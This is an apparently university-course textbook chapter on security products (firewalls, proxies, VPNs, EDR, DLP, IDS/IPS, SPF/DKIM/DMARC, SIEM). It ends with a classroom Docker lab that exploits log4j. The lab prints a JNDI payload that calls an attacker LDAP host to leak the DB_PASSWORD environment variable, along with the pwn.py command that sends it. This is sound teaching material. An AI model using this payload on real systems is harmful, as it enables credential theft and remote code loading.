<?xml version="1.0" encoding="UTF-8"?>

<chapter xml:id="ch6-security-solutions" xmlns:xi="http://www.w3.org/2001/XInclude">
  <title>Security Solutions</title>

  <introduction>
				<p>
				To help combat security breaches, many different vendors offer security solutions. These may be hardware or software designed to help mitigate a security threat. Security solutions may be created in-house, created custom by a third party, or outsourced and offered as a service. When evaluating solutions it is important to have a plan and understand the features and possible pitfalls of that product.
			</p>
  </introduction>

				<section xml:id="false-positives-negatives">
					<title>6.1. False Positives / Negatives</title>

					<p>
					When a security solution detects a threat, but no threat exists, that is a 
						<em>false positive</em>. Depending on the complexity of the solution it may utilize a set of rules, indicators of compromise, or possibly even artificial intelligence to trigger its warning system. In the case of a solution that creates a lot of false positives, it can be tiring for a team to go through each alert. Eventually teams are conditioned to ignore the alerts, making the security solution useless.
				
					</p>

					<p>
					The key to lowering the false positive rate of a system is to better tune the rule set used to trigger the warnings. A security team may spend time determining a baseline of events and looking for abnormalities that correspond to actual attacks. This information can then be used to build a better detection system.
				</p>

					<p>
					Example 6. Webroot Antivirus
				</p>

					<p>
						<url href="https://www.nbcnews.com/tech/tech-news/popular-antivirus-program-mistakenly-ids-windows-threat-creating-chaos-n750521">In 2017 a popular antivirus service created a bad rule that identified certain Windows operating system files as threats.</url> The antivirus solution quarantined these files, which were critical for the operation of the machine. The result was a machine that was unusable.
				
					</p>

					<p>
					For 13 minutes, Webroot distributed this rule to its antivirus software shutting down operations on an untold number of machines. Fortunately Webroot was able to quickly identify the problem and send out an update which would have allowed the machines to automatically fix the problem. Unfortunately their infrastructure for distributing the update quickly became overloaded.
				</p>

					<p>
					When a security solution fails to identify a threat, this is known as a 
						<em>false negative</em>. While no solution can ever be 100% effective, false negatives can undermine confidence in a product. False negatives may be resolved by a skilled SOC team, closely monitoring what is happening. It is also possible to address false negatives through 
						<em>Layered Security</em> a concept that we will cover next.
				
					</p>

				</section>
				<section xml:id="layered-security">
					<title>6.2. Layered Security</title>

					<figure xml:id="fig-layers">
					<caption></caption>
					<image source="layers.svg">
						<shortdescription>Diagram illustrating a conceptual layered security model with six distinct levels of defense.</shortdescription>
						<description>
						<p>The diagram displays a stacked representation of a layered security approach, commonly known as defense in depth. It consists of six horizontal rectangular blocks, each denoting a specific layer of security.</p>
						<p>The layers are numbered and labeled as follows from the base upwards:
						Layer 0 is "Operating System."
						Layer 1 is "Antivirus."
						Layer 2 is "Antimalware."
						Layer 3 is "Firewall."
						Layer 4 is "Intrusion Detection System."
						Layer 5, at the top, is "Human Monitoring."
						This visualization demonstrates how multiple security measures are combined to provide comprehensive protection.</p>
						</description>
					</image>
					</figure>

					<p>
					Given that a single security solution is never 100% effective it makes sense to approach security in layers and use multiple systems. There is often a lot of overlap between solutions and while that may seem inefficient in other fields, in cybersecurity we consider it a benefit. By using multiple solutions, sometimes referred to as multi-layered security or defense in depth, you can build a more robust protection against breaches.
				</p>

					<p>
					Let’s take a look at an example to see how layered security can help mitigate the effects of a real-world attack. Assume an SOC is supporting a web application on self-hosted machines. A malicious actor wishes to exfiltrate data from the web application. They begin by testing to see if SQL several different SQL injection attacks yield any results.
				</p>

					<p>
					A well designed web application should sanitize its inputs and may prevent the queries from making it to the database. Similarly an alert team may notice a sudden uptick in SQL queries, far beyond the usual baseline for the application. An IDS (Intrusion Detection System) may flag the queries as known SQL injection attacks. Assuming the attack makes it past the application, team, and the IDS, it is possible that the database user is configured according to the principle of least privilege and the queries will not be executed due to a lack of permissions.
				</p>

					<p>
					As you can see, any one of these layers may be fail, but by having multiple layers the chance of an attack occurring is greatly diminished.
				</p>

				</section>
				<section xml:id="network-solutions">
					<title>6.3. Network Solutions</title>

					<p>
					Many products are available for handling network traffic. They are typically marketed as either stand-alone devices, software to install on internal devices, or a subscription service that routes traffic through an external appliance. In the age of cloud computing network security as a service is becoming increasingly popular.
				</p>

					<paragraphs xml:id="firewall">
						<title>6.3.1. Firewall</title>

						<p>
						A firewall is a service/software/device that blocks unwanted traffic and permits wanted traffic. Typically a firewall is a barrier between and private network and the Internet.
					</p>

						<p>
						Software like 
							<url href="https://wiki.nftables.org/wiki-nftables/index.php/Main_Page">nftables</url> can be used to build a firewall on a Linux router for many interior clients. Interior clients may also run host-based firewalls such as 
							<url href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security">Windows Defender Firewall</url>. Finally hardware solutions for plug-in firewall devices are available from many vendors including Palo Alto and Cisco. Any combination of these solutions may be used.
					
						</p>

						<p>
						Firewalls typically employ rules regarding which packets can come in and how to handle them. For example a firewall may have a rule to 
							<c>ALLOW</c> packets from exterior hosts connecting on port 22. This would allow SSH connections. Likewise a firewall may have a rule to track internal to external connection requests and perform network address translation (NAT). On an IPv4 network it is common to have a firewall also perform NAT.
					
						</p>

						<p>
						Next-Gen Firewalls (NGFW) perform the same functions of a standard firewall, but also employ an integrated intrusion prevention system (IPS) to mitigate threats. The firewall is a perfect place to perform these actions as it can easily close of connections. NGFW often tout artificial intelligence threat monitoring and automatic threat intelligence updating (typically updating attack signatures). A NGFW can also easily be built on a Linux device by making use of 
							<url href="https://www.snort.org/">an IPS</url> in conjunction with a netfilter firewall.
					
						</p>

						<p>
						Network infrastructure may also make use of a special space 
							<em>outside</em> of a firewall called the Demilitarized Zone (DMZ). Servers that need to be directly connected to the Internet are often put in the DMZ so they don’t have a deal with restrictive firewall rules. These servers may be used to detect malicious activity, monitor incoming traffic, or to handle basic requests such as serving static web pages.
					
						</p>

						<p>
						The largest firewall in the world is the Chinese Great Firewall, started in 1998 as a way to prevent outside influence in China. It is a system used to block IPs, hijack DNS queries, throttle traffic, and perform MitM decryption. The Great Firewall is made of proxies and firewalls performing packet-inspection and content filtering. VPNs are often employed within China to circumvent the great firewall and the great firewall is continually updated to attempt to detect and shut down this traffic.
					</p>

					</paragraphs>
					<paragraphs xml:id="proxy">
						<title>6.3.2. Proxy</title>
						<figure xml:id="fig-tls-proxy">
						<caption></caption>
						<image source="tls-proxy.svg">
							<shortdescription>Diagram illustrating the operational flow of a TLS decrypting proxy between a user and a server.</shortdescription>
							<description>
							<p>The diagram, titled "TLS Decrypting Proxy," depicts three components in a row: a "User" on the left, a "Proxy" in the center, and a "Server" on the right. </p>
							<p>Bidirectional arrows labeled "encrypted traffic" connect the "User" to the "Proxy," and the "Proxy" to the "Server." This signifies that data exchanged between the user and proxy, and between the proxy and server, is encrypted.</p>
							<p>Above the "Proxy" component, a circular flow of actions is illustrated with arrows: Traffic arriving at the proxy is first "Decrypt(ed)," then "Inspect(ed)," and finally "Re-encrypt(ed)" before being sent onwards. This cycle highlights the proxy's capability to intercept, examine, and then re-secure TLS traffic.</p>
							</description>
						</image>
						</figure>

						<p>
						A proxy typically sits between the users and an external network. Proxies and receive and send requests on behalf of a user, allowing for full control over the traffic going out and coming back in.
					</p>

						<p>
						Proxies can be used for caching, access control, URL filtering, content scanning, and even packet inspection. Proxy solutions may be explicit or transparent and are offered by many companies including McAfee, Fortigate, Netsparker, and Palo Alto. A typical application of a proxy would be to filter explicit content on a school district network.
					</p>

						<p>
						Proxies can also be broken into 
							<em>forward</em> and 
							<em>reverse</em> configurations. A forward proxy passes requests from a private or internal network to the internet. Forward proxies can speed up local requests through caching and validate that the request should be performed. Forward proxies are interoperable with standard firewalls and network address translation (NAT).
					
						</p>

						<p>
						Reverse proxies take requests from an external source and pass it to an internal service. This helps prevent clients from having direct access to internal services. Reverse proxies can utilize caching and validate requests as well. A reverse proxy can also be configured to work with a firewall. Whereas it used to be common practice to place a server in a demilitarized zone (DMZ) outside of a firewall, it is now far more common to employ a reverse proxy to reach that server.
					</p>

					</paragraphs>
					<paragraphs xml:id="load-balancer">
						<title>6.3.3. Load Balancer</title>

						<p>
						A common application for reverse proxies is to act as a load balancer for traffic. Load balancers distribute work, in the form of external client requests, among the internal resources, typically servers.
					</p>

						<p>
						For example, if a company has four servers supporting a web application, they may employ a reverse proxy load balancer that takes requests from clients and passes that request to one of the four internal servers. Different metrics are used to determine how the servers are utilized including least used (round robin), weighted, least amount of active connections. Load balancers optimize bandwidth and increase availability.
					</p>

					</paragraphs>
					<paragraphs xml:id="vpn">
						<title>6.3.4. VPN</title>

						<p>
						A virtual private network (VPN) is used to encrypt internet traffic between two networks or a client and a network. VPNs have become standard procedure for linking remote offices or connecting remote workers. Given the growth of working from home, almost all users have become familiar with what a VPN is and what it does.
					</p>

						<p>
						Site-to-site VPNs are typically used for linking offices together. This kind of VPN is on permanently. An example would be linking two college campuses: NJIT Newark and NJIT Jersey City. In this scenario users on either campus expect to be able to connect securely to services on the opposite campus at all times. The traffic is encrypted and carried over the Internet.
					</p>

						<p>
						Remote access VPNs are used by individuals connecting in to a secure network. This kind of VPN is usually stated through a application such as Cisco AnyConnect. When the application is running the user is able to securely access internal resources as if they were at the office.
					</p>

						<p>
						Many vendors offer VPN products including Cisco, Citrix, Fortinet, Palo Alto, and Checkpoint. Many open source options also exist for building VPNs including 
							<url href="https://openvpn.net/">OpenVPN</url>, 
							<url href="https://www.wireguard.com/">WireGuard</url>, and 
							<url href="https://linuxhint.com/how-to-implement-ipsec-in-linux/">IPsec</url>.
					
						</p>

					</paragraphs>
					<paragraphs xml:id="tap">
						<title>6.3.5. TAP</title>

						<p>
						Sometimes it is necessary for a network or security engineer to monitor what is happening on a particular network segment. In this case a network terminal access point (TAP) can be employed. A TAP creates a copy of network traffic and forwards it to a particular port on a switch or router.
					</p>

					</paragraphs>
				</section>
				<section xml:id="edr">
					<title>6.4. EDR</title>

					<p>
					Endpoint Detection and Response (EDR) is used to secure endpoints: servers, workstations, desktops, mobile devices, etc. EDR is typically implemented as a host-based incident prevention system (HBIPS), software that runs on the endpoint to monitor and collect data.
				</p>

					<p>
					These systems will usually watch for indicators of compromise, scan for malware, and can even quarantine or shutdown the endpoint as needed. Company hardware is a significant investment for any business and an EDR makes sure that investment is protected. Many systems exist for EDR including FireEye, SEP, and CrowdStrike.
				</p>

				</section>
				<section xml:id="data-loss-prevention">
					<title>6.5. Data Loss Prevention</title>

					<p>
					Data loss prevention (DLP) solutions aim to stop the exfiltration of sensitive data. This could be personally identifying information (PI), medical records, social security numbers (SSNs), credit card numbers, etc. Typically DLP either functions on the endpoint and server, data at rest, or on the network, data in motion.
				</p>

					<p>
					Network DLP solutions may monitor emails or web traffic for sensitive strings, such as SSNs. When an SSN is detecting in an email, the email is quarantined and an alert is sent. Server and endpoint DLP solutions may periodically scan the system to see if sensitive strings are stored on the system. If it is a system that shouldn’t have access to sensitive data an alert is sent. DLP on an endpoint may also limit tasks like USB usage or bulk data transmitting.
				</p>

				</section>
				<section xml:id="idsips">
					<title>6.6. IDS/IPS</title>

					<p>
					Intrusion Detection Systems and Intrusion Prevention Systems are systems that monitor network traffic to detect/prevent attacks. These systems may look for known exploits, such as SQL injection patterns, in the traffic and trigger an alert when detected. An intrusion 
						<em>prevention</em> system will take it one step further and actually shut down the connection or kill the offending process.
				
					</p>

					<p>
					These systems employ exploit signatures or IDs that are indicators of compromise (IoCs), anomalies, or strange behaviors. The power of an IDS/IPS often comes from how up-to-date it’s signature database is. There are many solutions in the category including Splunk, QRadar, CrowdStrike, and SolarWinds.
				</p>

				</section>
				<section xml:id="email-solutions">
					<title>6.7. Email Solutions</title>
	
					<p>
					The original protocols used to send/receive email were simple and not designed for the challenges we face today. SPAM and phishing emails are unfortunately common and can be addressed with email client add-ons that scan for viruses or use patterns to identify phishing emails. Many of these tools are already built into Google’s GMail or Microsoft's Exchange.
				</p>

					<p>
					Another large challenge is verifying the sender of an email. Currently three common methods exist: Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and Domain-base Message Authentication, Reporting, and Conformance (DMARC).
				</p>

					<p>
					SPF utilizes TXT records on a DNS domain to verify the IP of a sender. When inbound mail is received, the SPF information for the domain of the sender is retrieved, giving an allowed list of IPs. For example, NJIT’s SPF record currently looks like this:
				</p>

					<pre>v=spf1 ip4:128.235.251.0/24 ip4:128.235.209.0/24 ip4:66.207.100.96/27 ip4:66.207.98.32/27 ip4:205.139.104.0/22 ip4:206.79.6.0/24 ip4:209.235.101.208/28 ip4:216.185.73.96/27 ip4:69.196.241.0/28 ip4:69.196.242.128/28 ip4:46.183.242.192/28 ip4:202.38.144.192/28 ip4:69.196.236.208/28 ip4:103.225.232.128/28 ip4:37.216.222.128/28 ip4:64.125.200.96/28 ip4:74.217.49.0/25 ip4:69.25.227.128/25 ip4:52.45.50.190 ip4:198.187.196.100 include:_netblock.njit.edu include:spf.sparkmail.org ~all</pre>

					<p>
					It is important to note that not all of these IPs belong to NJIT. Some may be groups that send emails on NJIT’s behalf like mass mailers, web applications, etc. When properly configured SPF prevents an attacker from impersonating emails from a domain.
				</p>

					<p>
					DKIM utilizes public and private key cryptography to ensure that an email originated from a particular SMTP server. Public keys for a domain are advertised through a TXT DNS record for a particular domain. Private keys are used by the SMTP server for that domain to sign the emails being sent. A receiving SMTP server can then verify that the message originated from a valid SMTP server for that domain. Private keys can also be distributed to SMTP servers that send emails on behalf of the domain.
				</p>

					<p>
					DMARC applies policies to the SPF and DKIM validations. DMARC answers questions like, "What should I do if a message is from a valid SPF IP but doesn’t have a valid DKIM signature?" or "What should I do with a message that looks like SPAM but has a valid DKIM signature?" DMARC puts many of the tools used to verify email together in a layered approach to determine whether to pass, quarantine, or block an email.
				</p>
	
				</section>
				<section xml:id="siem">
					<title>6.8. SIEM</title>
					<figure xml:id="fig-seim">
					<caption>seim</caption>
					<image source="seim.svg">
						<shortdescription>Diagram illustrating a Security and Information Event Management (SIEM) system aggregating data from multiple security and network sources.</shortdescription>
						<description>
						<p>The diagram depicts a central rectangular component labeled "[S]ecurity and [I]nformation [E]vent [M]anagement," with the initial letters S, I, E, M bracketed to emphasize the acronym SIEM. This box represents the SIEM system.</p>
						<p>Arrows point from various external sources towards this central SIEM box, symbolizing the collection of log and event data. These sources, labeled around the SIEM, are:
						From the top: "Firewalls" and "Servers."
						From the left: "Workstations" and "Routers."
						From the right: "Switches" and "Proxies."
						From the bottom: "IPS" (Intrusion Prevention System) and "DMARC" (Domain-based Message Authentication, Reporting, and Conformance).</p>
						<p>This visualization highlights the function of a SIEM in centralizing and processing security-related information from diverse components within an IT infrastructure.</p>
						</description>
					</image>
					</figure>
					<p>
					Security and Information Event management is a system for real-time monitoring of security information. Typically a SIEM system presents a dashboard showing events and has the ability to generate reports or create tickets. It may be separate device, software on an internal device, or even a third party service. Some examples of popular SIEMs are QRadar, Splunk, and Azure Sentinel.
				</p>

				</section>
				<section xml:id="lab-exploiting-log4j">
					<title>6.9. Lab: Exploiting log4j</title>

					<p>
					In this lab we will examine the log4j vulnerability, 
						<url href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</url>. This vulnerability takes advantage of a flaw in a common logging library used by many Java applications, including Apache, neo4j, Steam, iCloud, and Minecraft. Any attacker that can cause a message to be logged can use the Java Naming and Directory Interface (JNDI) and cause the target to reach out to another server, LDAP in our example, and load a remote Java class file. This file can contain any code that the attacker wishes to inject into the server process.
				
					</p>
				<question>
					<p>
					Do some research: What versions of log4j are affected by this vulnerability?
				</p>
			</question>

					<p>
					This lab uses a Docker Compose configuration to simulate a network with an attacker and a target. The target runs a 
						<url href="https://github.com/leonjza/log4jpwn">known-vulnerable, example application</url> written by leonjza. This example application logs the 
						<c>User-Agent</c> header, request path, and a query string parameter of a request as seen below:
				
					</p>

					<p>
					App.java
				</p>

					<pre>package com.sensepost.log4jpwn;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

import static spark.Spark.*;

public class App {
    static final Logger logger = LogManager.getLogger(App.class.getName());

    public static void main(String[] args) {

        port(8080);

        get("/*", (req, res) -&gt; {

            String ua = req.headers("User-Agent");
            String pwn = req.queryParams("pwn");
            String pth = req.pathInfo();

            System.out.println("logging ua: " + ua);
            System.out.println("logging pwn: " + pwn);
            System.out.println("logging pth: " + pth);

            // trigger
            logger.error(ua);
            logger.error(pwn);
            logger.error(pth);

            return "ok: ua: " + ua + " " + "pwn: " + pwn + " pth:" + pth;
        });
    }
}</pre>
					<question>
					<p>
					What port does our vulnerable app run on?
				</p>
				</question>

					<p>
					Our attacker container has 
						<url href="https://github.com/leonjza/log4jpwn/blob/master/pwn.py">the 
							<c>pwn.py</c> script
						</url>, also by leonjza, which does two things:
				
					</p>

					<p>
						<ol>
							<li>
								<p>
										Runs a fake LDAP server in the background on port 8888
									</p>
							</li>
							<li>
								<p>
										Sends a request with the JNDI URI referencing the fake LDAP server asking for a Java value to leak
									</p>
							</li>
							<li>
								<p>
										Parses and prints the response
									</p>
							</li>
						</ol>
					</p>

					<p>
					Using this setup we can show how log4j can be used to leak sensitive information from running processes. We will use it to leak the value of the environment variable 
						<c>DB_PASSWORD</c>. As it isn’t uncommon to store secrets in environment variables on running containers, this should suffice to see just how devastating this exploit can be.
				
					</p>

					<p>
					Start by downloading 
						<url href="https://github.com/rxt1077/it230/blob/main/labs/log4j.zip?raw=true">the zip archive of this lab</url> and unzipping it in a directory where you have write permissions and can navigate to in a terminal application. Once you’ve done that, you can bring the lab up by typing 
						<c>docker-compose up</c> in that directory. Output should look similar to what you see below:
				
					</p>

					<pre>PS C:\Users\rxt1077\it230\labs\log4j&gt; docker-compose up
[+] Running 2/0
 - Container log4j-target-1    Created                                                            0.0s
 - Container log4j-attacker-1  Created                                                            0.0s
Attaching to log4j-attacker-1, log4j-target-1
log4j-attacker-1 exited with code 0
log4j-target-1    | WARNING: sun.reflect.Reflection.getCallerClass is not supported. This will impact performance.
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.util.log - Logging initialized @815ms to org.eclipse.jetty.util.log.Slf4jLog
log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - == Spark has ignited ...
log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - &gt;&gt; Listening on 0.0.0.0:8080
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - jetty-9.4.z-SNAPSHOT; built: 2019-04-29T20:42:08.989Z; git: e1bc35120a6617ee3df052294e433f3a25ce7097; jvm 11.0.14+9-post-Debian-1deb11u1
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - DefaultSessionIdManager workerName=node0
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - No SessionScavenger set, using defaults
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - node0 Scavenging every 600000ms
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@401fccd3{HTTP/1.1,[http/1.1]}{0.0.0.0:8080}
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - Started @960ms</pre>

					<p>
					You’ll notice that the 
						<c>target</c> service is up and running the 
						<c>log4jpwn</c> example application and that its output goes straight to the screen. The 
						<c>attacker</c> service will exit immediately as it is meant for interactive use and doesn’t run anything in the background. In another terminal, navigate to the lab directory again and run 
						<c>docker-compose run attacker bash</c>. This will be the shell that you use to attack the target:
				
					</p>

					<pre>PS C:\Users\rxt1077\it230\labs\log4j&gt; docker-compose run attacker bash
root@3971c61303c8:/(1)</pre>

					<table>
						<title></title>
						<tabular>
							<row class="odd">
								<cell halign="left">
									<term>1</term>
								</cell>
								<cell halign="left">Notice how the prompt changes once we are in the container</cell>
							</row>
						</tabular>
					</table>

					<p>
					In the attack shell, use the 
						<c>ip</c> command to determine the IPv4 address of your container. We will need this since the 
						<c>attacker</c> container will be listening for connections from 
						<c>target</c> once the exploit string is logged.
				
					</p>

					<pre>root@3971c61303c8:/# ip addr show dev eth0
58: eth0@if59: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet &lt;IP_ADDRESS&gt;/16 brd 172.20.255.255 scope global eth0 (1)
       valid_lft forever preferred_lft forever</pre>

					<table>
						<title></title>
						<tabular>
							<row class="odd">
								<cell halign="left">
									<term>1</term>
								</cell>
								<cell halign="left">You’re IP is 
									<em>not</em>
									<c>&lt;IP_ADDRESS&gt;</c> it is whatever you find in its place!
								</cell>
							</row>
						</tabular>
					</table>

					<p>
					Once you have the IP address, you can run the 
						<c>pwn.py</c> script on the 
						<c>attacker</c> container and you should be able to read the 
						<c>DB_PASSWORD</c> environment variable on the 
						<c>target</c> container.
				
					</p>

					<pre>root@3971c61303c8:/# python /pwn.py --listen-host &lt;IP_ADDRESS&gt; --exploit-host &lt;IP_ADDRESS&gt; --target http://target:8080 --leak '${env:DB_PASSWORD}' (1)
 i| starting server on &lt;IP_ADDRESS&gt;:8888
 i| server started
 i| setting payload in User-Agent header
 i| sending exploit payload ${jndi:ldap://&lt;IP_ADDRESS&gt;:8888/${env:DB_PASSWORD}} to http://target:8080/
 i| new connection from &lt;TARGETS_IP&gt;:44050
 v| extracted value: &lt;DB_PASSWORD&gt; (2)
 i| request url was: http://target:8080/
 i| response status code: 200</pre>

					<table>
						<title></title>
						<tabular>
							<row class="odd">
								<cell halign="left">
									<term>1</term>
								</cell>
								<cell halign="left">Docker Compose will resolve service names to IP addresses so the target URI doesn’t require finding an IP</cell>
							</row>
							<row class="even">
								<cell halign="left">
									<term>2</term>
								</cell>
								<cell halign="left">The value of 
									<c>DB_PASSWORD</c> can will be here.
								</cell>
							</row>
						</tabular>
					</table>
					<question>
					<p>
					What is the database password?
				</p>
			</question>
			<question>
					<p>
					What steps would you take to mitigate the risk of a deployed application having this vulnerability?
				</p>
				</question>

				</section>
				<section xml:id="security-solutions-review">
					<title>6.10. Review Questions</title>
					<p>
						<ol>
							<li>
								<p>
									<em>What does it mean that security solutions are migrating from physical devices to cloud services? Give an example.</em>
								</p>
							</li>
							<li>
								<p>
									<em>In your opinion, which is more damaging, a false positive or a false negative? Why?</em>
								</p>
							</li>
							<li>
								<p>
									<em>What are the applications of a site-to-site VPN? Give an example of a scenario where an office might employ one.</em>
								</p>
							</li>
						</ol>
					</p>

				</section>

</chapter>